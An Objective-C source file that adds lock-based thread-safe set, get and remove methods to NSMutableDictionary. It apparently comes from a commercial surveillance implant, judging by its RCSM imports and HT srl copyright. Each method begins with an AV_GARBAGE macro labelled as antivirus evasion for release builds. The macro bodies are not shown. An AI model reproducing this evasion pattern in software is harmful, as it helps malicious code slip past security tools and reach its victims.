/*
 * NSMutableArray Thread Safety Category
 *  This is an NSMutableDictionary category in order to provide thread safety
 *  capabilities
 *
 *  http://developer.apple.com/mac/library/technotes/tn2002/tn2059.html#Section6
 *
 * Created by Alfredo 'revenge' Pesoli on 20/05/2010
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "NSMutableDictionary+ThreadSafe.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation NSMutableDictionary (ThreadSafety)

- (void)threadSafeSetObject: (id)anObject
                     forKey: (id)aKey
                  usingLock: (NSLock *)aLock
{   
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [aLock lock];
  [[anObject retain] autorelease];
  [self setObject: anObject
           forKey: aKey];
  [aLock unlock];
}

- (void)threadSafeRemoveObjectForKey: (id)aKey
                           usingLock: (NSLock *)aLock
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [aLock lock];
  [self removeObjectForKey: aKey];
  [aLock unlock];
}

- (id)threadSafeObjectForKey: (id)aKey
                   usingLock: (NSLock *)aLock
{
  id result;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [aLock lock];
  result = [self objectForKey: aKey];
  [[result retain] autorelease];
  [aLock unlock];
  
  return result;
}

@end
